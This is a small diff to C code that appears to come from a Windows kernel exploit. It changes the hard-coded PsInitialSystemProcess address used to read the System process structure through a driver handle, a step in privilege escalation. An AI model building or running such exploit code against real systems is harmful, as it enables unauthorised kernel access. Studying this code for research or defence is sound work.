@@ -220,7 +220,7 @@ int main() {
         return 1;
     }
 
-    uint64_t PsInitialSystemProcessVA = 0xfffff80000000000; // Set manually or leak
+    uint64_t PsInitialSystemProcessVA = 0x8755E0; // Set manually or leak
     uint64_t sysEP = 0;
     if (!ReadVA(h, 0, PsInitialSystemProcessVA, &sysEP, 8)) {
         WriteLog("[-] Could not read PsInitialSystemProcess.");
